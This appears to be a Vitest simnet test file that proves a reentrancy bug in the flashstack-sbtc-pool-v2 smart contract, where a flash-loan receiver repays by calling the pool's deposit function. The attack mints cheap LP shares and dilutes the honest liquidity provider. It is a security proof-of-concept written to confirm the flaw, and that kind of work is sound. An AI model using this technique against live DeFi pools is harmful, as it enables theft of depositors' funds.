import { describe, expect, it, beforeEach } from "vitest";
import { Cl } from "@stacks/transactions";

/**
 * SIP-010 counterpart of stx-pool-v2-deposit-reentrancy.test.ts (ajv.4.8).
 * flashstack-sbtc-pool-v2 was read directly and judged to share the STX
 * pool's deposit-as-repayment vector (identical structure, no reentrancy
 * lock) but not independently simnet-proven -- ajv.4.8's own NEXT STEPS item
 * 1. This proves it does not merely "look like" the same bug: the sBTC
 * pool's repayment path goes through a SIP-010 `transfer` call (which
 * asserts tx-sender == sender) rather than `stx-transfer?`, a materially
 * different mechanism that could in principle have blocked the vector and
 * did not.
 *
 * A receiver funded only with fee-sized sBTC (not the loan amount itself)
 * repays a flash-loan by calling the pool's own `deposit` instead of a plain
 * transfer. That satisfies the balance-delta repayment check (the pool's
 * sBTC balance genuinely grows by >= fee) while ALSO minting the caller LP
 * shares, priced against the pool's balance as depressed by this same loan's
 * outbound transfer -- a cheaper share price than any honest depositor could
 * get, diluting the existing LP.
 */

const POOL = "flashstack-sbtc-pool-v2";
const SBTC = "sbtc-token";
const RX = "test-sbtc-pool-v2-receiver-deposit-reentrant";

const LP_DEP = 10_000_000; // 0.1 BTC in sats, the only honest LP
const LOAN_AMOUNT = 9_900_000; // 99% of the reserve, under the 0.1 BTC max-single-loan cap
// Attacker's own capital: must cover the loan's fee (0.05% of LOAN_AMOUNT =
// 4,950 sats) so the receiver's own balance (loan + buffer) is enough to
// self-deposit amount+fee. Anything less and the as-contract deposit fails
// with ERR-TRANSFER-FAILED (insufficient balance) instead of succeeding
// cheaply -- there is no way around fronting at least the real fee.
const RX_BUFFER = 5_000;

describe("flashstack-sbtc-pool-v2: reentrant deposit-as-repayment", () => {
  let deployer: string, attacker: string, honestLp: string, rxPrincipal: string;

  const mintSbtc = (amount: number, to: string) =>
    simnet.callPublicFn(SBTC, "mint", [Cl.uint(amount), Cl.principal(to)], deployer);
  const shares = (who: string) =>
    Number(simnet.callReadOnlyFn(POOL, "get-shares", [Cl.principal(who)], deployer).result.value);
  const sbtcValue = (who: string) =>
    Number((simnet.callReadOnlyFn(POOL, "get-lp-value", [Cl.principal(who)], deployer).result as any).value.value);
  const sbtcBalance = (who: string) =>
    Number((simnet.callReadOnlyFn(SBTC, "get-balance", [Cl.principal(who)], deployer).result as any).value.value);

  beforeEach(() => {
    deployer = simnet.getAccounts().get("deployer")!;
    attacker = simnet.getAccounts().get("wallet_1")!;
    honestLp = simnet.getAccounts().get("wallet_2")!;
    rxPrincipal = `${deployer}.${RX}`;

    mintSbtc(LP_DEP, honestLp);
    simnet.callPublicFn(POOL, "deposit", [Cl.uint(LP_DEP)], honestLp);
    simnet.callPublicFn(POOL, "add-approved-receiver", [Cl.principal(rxPrincipal)], deployer);
    mintSbtc(RX_BUFFER, rxPrincipal);
  });

  it("the loan succeeds by depositing instead of repaying directly", () => {
    const result = simnet.callPublicFn(
      POOL, "flash-loan", [Cl.uint(LOAN_AMOUNT), Cl.contractPrincipal(deployer, RX)], attacker,
    ).result;
    expect(result).toBeOk(Cl.bool(true));
  });

  it("the receiver contract ends up owning a share of the pool, funded by the loan itself -- not the attacker's wallet", () => {
    const attackerSbtcBefore = sbtcBalance(attacker);

    simnet.callPublicFn(
      POOL, "flash-loan", [Cl.uint(LOAN_AMOUNT), Cl.contractPrincipal(deployer, RX)], attacker,
    );

    const attackerSbtcAfter = sbtcBalance(attacker);
    const attackerOwnCapitalSpent = attackerSbtcBefore - attackerSbtcAfter;

    const rxShares = shares(rxPrincipal);
    const rxValue = sbtcValue(rxPrincipal);
    const attackerShares = shares(attacker);
    const honestLpValue = sbtcValue(honestLp);

    // With `as-contract`, the minted shares land on the receiver CONTRACT
    // (funded out of the loan it already holds), not the attacker's EOA.
    // The attacker's entire out-of-pocket cost for the whole attack is the
    // fee-sized RX_BUFFER pre-funded into the receiver in beforeEach -- the
    // flash-loan call itself costs the attacker nothing further.
    expect(attackerShares).toBe(0);
    expect(rxShares).toBeGreaterThan(0);
    expect(attackerOwnCapitalSpent).toBe(0);
    expect(rxValue).toBeGreaterThan(RX_BUFFER);
    expect(honestLpValue).toBeLessThan(LP_DEP);
  });

  it("control: an honest repay-by-transfer receiver gets zero shares, isolating the effect to the deposit-reentrancy mechanism", () => {
    const GOOD_RX = "test-sbtc-pool-receiver-good";
    const goodRxPrincipal = `${deployer}.${GOOD_RX}`;
    mintSbtc(RX_BUFFER, goodRxPrincipal);
    simnet.callPublicFn(POOL, "add-approved-receiver", [Cl.principal(goodRxPrincipal)], deployer);

    const result = simnet.callPublicFn(
      POOL, "flash-loan", [Cl.uint(LOAN_AMOUNT), Cl.contractPrincipal(deployer, GOOD_RX)], attacker,
    ).result;

    expect(result).toBeOk(Cl.bool(true));
    expect(shares(goodRxPrincipal)).toBe(0);
    expect(shares(attacker)).toBe(0);
  });
});
